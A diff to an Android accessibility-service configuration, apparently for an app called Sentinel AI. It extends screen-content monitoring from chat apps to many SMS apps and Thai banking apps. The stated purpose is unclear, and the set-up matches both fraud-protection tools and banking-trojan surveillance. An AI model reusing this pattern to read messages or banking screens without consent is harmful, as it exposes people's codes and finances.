@@ -1,10 +1,10 @@
 <?xml version="1.0" encoding="utf-8"?>
 <accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
-    android:accessibilityEventTypes="typeWindowContentChanged|typeViewTextChanged|typeNotificationStateChanged"
+    android:accessibilityEventTypes="typeWindowStateChanged|typeWindowContentChanged|typeViewTextChanged|typeNotificationStateChanged"
     android:accessibilityFeedbackType="feedbackGeneric"
     android:canRetrieveWindowContent="true"
     android:description="@string/accessibility_description"
     android:notificationTimeout="100"
-    android:packageNames="com.linecorp.line.android,com.facebook.orca,com.facebook.katana,com.instagram.android,com.whatsapp"
+    android:packageNames="com.linecorp.line.android,com.facebook.orca,com.facebook.katana,com.instagram.android,com.whatsapp,com.google.android.apps.messaging,com.samsung.android.messaging,com.android.mms,com.android.messaging,com.miui.mms,com.coloros.mms,com.vivo.messaging,com.huawei.mms,com.transsion.message,com.kasikorn.retail.mbanking.wap,com.scb.phone,com.bbl.mobilebanking,ktbcs.netbank,com.krungthai.beacon,com.mobilife.gsb.mymo,com.gsb.mobile.banking,com.krungsri.kma,com.TMBTOUCH.PRODUCTION,com.cimbclicksTH,com.uob.mightyth,com.kbank.service"
     android:settingsActivity="com.sentinel.ai.ui.SetupActivity"
     android:summary="@string/accessibility_summary" />
